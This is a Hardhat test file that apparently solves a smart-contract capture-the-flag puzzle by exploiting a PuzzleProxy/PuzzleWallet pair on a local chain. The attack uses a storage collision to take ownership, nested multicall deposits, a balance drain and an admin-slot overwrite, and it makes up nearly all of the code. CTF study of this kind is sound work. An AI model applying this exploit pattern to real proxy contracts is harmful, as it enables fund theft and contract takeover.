import { Interface } from "@ethersproject/abi";
import { expect } from "chai";
import { ethers } from "hardhat";
import { PuzzleProxy, PuzzleWallet } from "../typechain-types";

describe("PuzzleProxy", function () {

  let puzzleProxy: PuzzleProxy;
  let puzzleWallet: PuzzleWallet;
  let walletInterface: Interface;

  beforeEach(async function () {
    const puzzleWalletFactory = await ethers.getContractFactory("PuzzleWallet");
    puzzleWallet = await puzzleWalletFactory.deploy();
    await puzzleWallet.deployed();

    const puzzleProxyFactory = await ethers.getContractFactory("PuzzleProxy");
    walletInterface = new ethers.utils.Interface(["function deposit()", "function init(uint256)", "function multicall(bytes[])"])
    const init_encode = walletInterface.encodeFunctionData("init", [ethers.utils.parseEther('0.01')]);

    const accounts = await ethers.getSigners();
    puzzleProxy = await puzzleProxyFactory.deploy(accounts[0].address, puzzleWallet.address, init_encode);

  });

  it("Should fuck PuzzleProxy success", async function () {
    const accounts = await ethers.getSigners();

    puzzleWallet = puzzleWallet.attach(puzzleProxy.address);

    expect(await puzzleWallet.owner()).to.equal(accounts[0].address);
    expect(await puzzleProxy.admin()).to.equal(accounts[0].address);

    await puzzleProxy.connect(accounts[1]).proposeNewAdmin(accounts[1].address);
    expect(await puzzleWallet.owner()).to.equal(accounts[1].address);

    expect(await puzzleWallet.whitelisted(accounts[1].address)).to.eq(false);
    await puzzleWallet.connect(accounts[1]).addToWhitelist(accounts[1].address);
    expect(await puzzleWallet.whitelisted(accounts[1].address)).to.eq(true);


    const depositEncode = walletInterface.encodeFunctionData("deposit", []);
    const multicallEncode = walletInterface.encodeFunctionData("multicall", [[depositEncode]]);
    await puzzleWallet.connect(accounts[1]).multicall(Array(1).fill(multicallEncode), { value: ethers.utils.parseEther('0.001') });

    const balances = await puzzleWallet.balances(accounts[1].address);


    await puzzleWallet.connect(accounts[1]).execute(accounts[1].address, balances, []);
    await puzzleWallet.connect(accounts[1]).setMaxBalance(accounts[1].address);
    expect(await puzzleProxy.admin()).to.equal(accounts[1].address);



  });

});
